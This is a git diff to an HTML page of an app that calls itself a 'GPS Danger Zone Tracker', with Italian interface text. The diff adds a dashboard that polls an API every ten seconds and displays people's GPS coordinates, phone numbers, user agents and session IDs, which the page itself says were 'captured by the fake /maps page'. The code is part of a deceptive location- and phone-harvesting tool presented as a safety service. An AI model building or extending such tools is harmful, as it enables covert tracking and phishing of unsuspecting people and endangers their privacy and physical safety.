@@ -55,6 +55,54 @@
             padding: 5px;
             border-radius: 3px;
         }
+        .tracking-section {
+            margin-top: 30px;
+            background: #fff3cd;
+            border: 1px solid #ffeaa7;
+            border-radius: 4px;
+            padding: 20px;
+        }
+        .tracking-item {
+            background: white;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 10px 0;
+            border-left: 4px solid #007bff;
+        }
+        .tracking-item.gps {
+            border-left-color: #28a745;
+        }
+        .tracking-item.phone {
+            border-left-color: #ffc107;
+        }
+        .tracking-item.session {
+            border-left-color: #dc3545;
+        }
+        .tracking-timestamp {
+            font-size: 0.9em;
+            color: #666;
+            margin-bottom: 5px;
+        }
+        .tracking-data {
+            font-family: monospace;
+            background: #f8f9fa;
+            padding: 10px;
+            border-radius: 3px;
+            margin-top: 10px;
+        }
+        .refresh-btn {
+            background: #007bff;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 15px;
+        }
+        .refresh-btn:hover {
+            background: #0056b3;
+        }
     </style>
 </head>
 <body>
@@ -103,6 +151,15 @@
             </div>
         </div>
 
+        <div class="tracking-section">
+            <h3>🎯 GPS Tracking Data - In Ordine Cronologico</h3>
+            <p>Dati catturati dalla pagina fake /maps</p>
+            <button class="refresh-btn" onclick="refreshTrackingData()">🔄 Aggiorna Dati</button>
+            <div id="trackingData">
+                <p>Caricamento dati di tracking...</p>
+            </div>
+        </div>
+
         <div style="text-align: center; margin-top: 30px; color: #6c757d;">
             <p>GPS Danger Zone Tracker v1.0.0 - Deployed on Render</p>
             <p>🛰️ Keeping you safe through location awareness</p>
@@ -119,6 +176,120 @@
             .catch(error => {
                 console.error('Error checking status:', error);
             });
+
+        // Function to refresh tracking data
+        function refreshTrackingData() {
+            document.getElementById('trackingData').innerHTML = '<p>🔄 Aggiornamento dati...</p>';
+            
+            fetch('/api/tracking')
+                .then(response => response.json())
+                .then(data => {
+                    displayTrackingData(data.tracking_data);
+                })
+                .catch(error => {
+                    console.error('Error fetching tracking data:', error);
+                    document.getElementById('trackingData').innerHTML = '<p>❌ Errore nel caricamento dei dati</p>';
+                });
+        }
+
+        // Function to display tracking data
+        function displayTrackingData(trackingData) {
+            const container = document.getElementById('trackingData');
+            
+            if (!trackingData || trackingData.length === 0) {
+                container.innerHTML = '<p>📭 Nessun dato di tracking disponibile</p>';
+                return;
+            }
+
+            let html = `<p>📊 <strong>${trackingData.length}</strong> eventi di tracking trovati:</p>`;
+            
+            trackingData.forEach(item => {
+                let typeIcon = '📍';
+                let typeText = 'Evento';
+                let className = 'tracking-item';
+                
+                if (item.type === 'gps') {
+                    typeIcon = '🌍';
+                    typeText = 'Coordinate GPS';
+                    className += ' gps';
+                } else if (item.type === 'phone') {
+                    typeIcon = '📱';
+                    typeText = 'Numero Telefono';
+                    className += ' phone';
+                } else if (item.type === 'session') {
+                    typeIcon = '📋';
+                    typeText = 'Sessione Completa';
+                    className += ' session';
+                }
+
+                html += `
+                    <div class="${className}">
+                        <div class="tracking-timestamp">
+                            ${typeIcon} <strong>${typeText}</strong> - ${formatTimestamp(item.timestamp)}
+                        </div>
+                        <div class="tracking-data">
+                            ${formatTrackingItem(item)}
+                        </div>
+                    </div>
+                `;
+            });
+            
+            container.innerHTML = html;
+        }
+
+        // Function to format timestamp
+        function formatTimestamp(timestamp) {
+            if (!timestamp) return 'Data sconosciuta';
+            const date = new Date(timestamp);
+            return date.toLocaleString('it-IT');
+        }
+
+        // Function to format tracking item details
+        function formatTrackingItem(item) {
+            let details = '';
+            
+            if (item.type === 'gps') {
+                details = `
+                    Sessione: ${item.session_id}<br>
+                    Latitudine: ${item.latitude}<br>
+                    Longitudine: ${item.longitude}<br>
+                    Precisione: ${item.accuracy || 'N/A'} metri<br>
+                    User Agent: ${item.user_agent || 'N/A'}
+                `;
+            } else if (item.type === 'phone') {
+                details = `
+                    Sessione: ${item.session_id}<br>
+                    Telefono: ${item.phone}<br>
+                    User Agent: ${item.user_agent || 'N/A'}
+                `;
+            } else if (item.type === 'session') {
+                let locationInfo = '';
+                if (item.location) {
+                    locationInfo = `Posizione: ${item.location.latitude}, ${item.location.longitude}<br>`;
+                }
+                details = `
+                    ${locationInfo}
+                    ${item.phone ? `Telefono: ${item.phone}<br>` : ''}
+                    Timestamp: ${item.timestamp}
+                `;
+            } else {
+                details = `
+                    Session ID: ${item.sessionId || item.session_id || 'N/A'}<br>
+                    Event Type: ${item.eventType || 'N/A'}<br>
+                    Data: ${JSON.stringify(item.data || {}, null, 2)}
+                `;
+            }
+            
+            return details;
+        }
+
+        // Load tracking data on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            refreshTrackingData();
+            
+            // Auto-refresh every 10 seconds
+            setInterval(refreshTrackingData, 10000);
+        });
     </script>
 </body>
 </html>
